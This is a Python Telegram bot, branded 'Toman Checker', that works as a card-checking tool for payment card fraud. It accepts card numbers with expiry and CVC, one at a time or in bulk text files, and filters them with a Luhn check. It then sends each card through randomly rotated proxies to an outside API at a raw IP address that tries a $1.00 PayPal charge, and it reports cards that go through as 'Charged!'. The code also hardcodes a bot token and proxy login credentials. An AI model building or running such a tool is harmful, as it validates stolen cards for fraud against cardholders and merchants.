import telebot
import time
import threading
import requests
import re
import random
from telebot import types
from datetime import datetime

token = '7700737624:AAEKOb2kJFTN6g-Cod4vDphfpqlJSsjzoHU'
bot = telebot.TeleBot(token, parse_mode="HTML")

admin = 7077294261
stopuser = {}

# ================== LOAD PROXIES FROM FILE ==================
def load_proxies():
    proxies = []
    try:
        with open("working_all.txt", "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    proxies.append(line)
        print(f"✅ Loaded {len(proxies)} proxies from working_all.txt")
    except Exception as e:
        print(f"❌ Proxy file error: {e}")
        proxies = ["dc.oxylabs.io:8000:harshop01_6Mzjy:V=DMlz+qMinV_n85"]
    return proxies

PROXIES = load_proxies()

def get_proxy():
    if not PROXIES:
        return None, "No Proxy"
    proxy_str = random.choice(PROXIES)
    try:
        if proxy_str.count(':') == 3:  # user:pass@host:port format
            user, passw, host, port = proxy_str.split(':')
            proxy_url = f"http://{user}:{passw}@{host}:{port}"
        else:  # host:port format
            host, port = proxy_str.split(':')
            proxy_url = f"http://{host}:{port}"
        print(f"[{datetime.now().strftime('%H:%M:%S')}] PROXY → {proxy_str}")
        return {"http": proxy_url, "https": proxy_url}, proxy_str
    except:
        return None, proxy_str

# ================== CHECKER ==================
def pali(ccx):
    ccx = ccx.strip()
    current_time = datetime.now().strftime('%H:%M:%S')
    proxy_dict, proxy_used = get_proxy()
    
    print(f"[{current_time}] CHECKING → {ccx}")
    
    try:
        url = f"http://138.128.240.15:8025/paypal_donate?cc={ccx}"
        print(f"[{current_time}] API CALL → {url}")
        
        r = requests.get(url, proxies=proxy_dict, timeout=25)
        text = r.text
        
        print(f"[{current_time}] STATUS → {r.status_code}")
        print(f"[{current_time}] RESPONSE → {text[:300]}")
        
        if "ORDER APPROVED" in text.upper() or "APPROVED" in text.upper() or "SUCCESS" in text.upper():
            print(f"[{current_time}] ✅ LIVE HIT")
            return "CHARGE 1.00$"
        else:
            print(f"[{current_time}] ❌ DECLINED")
            return "DECLINED"

    except Exception as e:
        print(f"[{current_time}] ❌ PROXY/ERROR: {e}")
        return "ERROR"

# ================== CARD REGEX ==================
def luhn_check(number: str) -> bool:
    total = 0
    reverse_digits = number[::-1]
    for i, d in enumerate(reverse_digits):
        n = int(d)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def reg(cc: str):
    parts = [p for p in re.split(r'\D+', cc) if p]
    if len(parts) >= 4:
        pan = parts[0]
        mm = parts[1].zfill(2)
        yy = parts[2]
        cvc = parts[3]
        if not luhn_check(pan):
            return None
        return f"{pan}|{mm}|{yy}|{cvc}"
    return None

# ================== BOT ==================
@bot.message_handler(commands=["start"])
def handle_start(message):
    mes = types.InlineKeyboardMarkup()
    mes.add(types.InlineKeyboardButton(text="Start Checking", callback_data="start"))
    bot.send_message(message.chat.id, f"Hi {message.from_user.first_name}, Welcome To Toman Checker", reply_markup=mes)

@bot.callback_query_handler(func=lambda call: call.data == 'start')
def handle_start_button(call):
    bot.send_message(call.message.chat.id, "Use /pp for single check or send .txt file")

@bot.message_handler(func=lambda message: message.text and (message.text.lower().startswith('.pp') or message.text.lower().startswith('/pp')))
def single_check(message):
    ko = bot.reply_to(message, "Checking...").message_id
    try:
        cc_text = message.reply_to_message.text if message.reply_to_message else message.text
        cc = reg(cc_text)
        if not cc:
            return bot.edit_message_text("Invalid Card Format!", message.chat.id, ko)

        last = pali(cc)
        msg = f"<strong>#PayPal_Custom 1.00$ 🔥\nCard: <code>{cc}</code>\nStatus: <code>{last}</code>\nChecked by: @TomanSamurai</strong>"
        bot.edit_message_text(msg, message.chat.id, ko, parse_mode="HTML")
    except Exception as e:
        bot.edit_message_text(f"Error: {e}", message.chat.id, ko)

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if not message.document.file_name.endswith('.txt'):
        return bot.reply_to(message, "Only .txt file allowed!")

    user_id = str(message.from_user.id)
    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    filename = f"com{user_id}.txt"

    with open(filename, "wb") as f:
        f.write(downloaded)

    bts = types.InlineKeyboardMarkup()
    bts.add(types.InlineKeyboardButton(text='PayPal Custom 1.00$', callback_data='ottpa2'))
    bot.reply_to(message, 'Select Gate:', reply_markup=bts)

@bot.callback_query_handler(func=lambda call: call.data == 'ottpa2')
def mass_check(call):
    def checker():
        user_id = str(call.from_user.id)
        filename = f"com{user_id}.txt"
        passs = 0
        basl = 0

        bot.edit_message_text("- Processing File with Auto Proxy...", call.message.chat.id, call.message.message_id)

        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()

        total = len(lines)
        stopuser.setdefault(user_id, {})['status'] = 'start'

        for cc in lines:
            if stopuser.get(user_id, {}).get('status') == 'stop':
                bot.edit_message_text("✅ Stopped!", call.message.chat.id, call.message.message_id)
                return

            cc_clean = reg(cc.strip())
            if not cc_clean:
                continue

            last = pali(cc_clean)

            if "CHARGE" in last or "APPROVED" in last.upper():
                passs += 1
                bot.send_message(call.from_user.id, f"✅ Charged!\n{cc_clean}\n{last}")
            else:
                basl += 1

            time.sleep(5)

        bot.edit_message_text(f"✅ Done!\nApproved: {passs}\nDeclined: {basl}\nTotal: {total}", 
                              call.message.chat.id, call.message.message_id)

    threading.Thread(target=checker, daemon=True).start()

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_check(call):
    uid = str(call.from_user.id)
    stopuser.setdefault(uid, {})['status'] = 'stop'
    bot.answer_callback_query(call.id, "Stopped ✅")

print("🚀 Bot Started with Auto Proxy System")
bot.infinity_polling(none_stop=True)
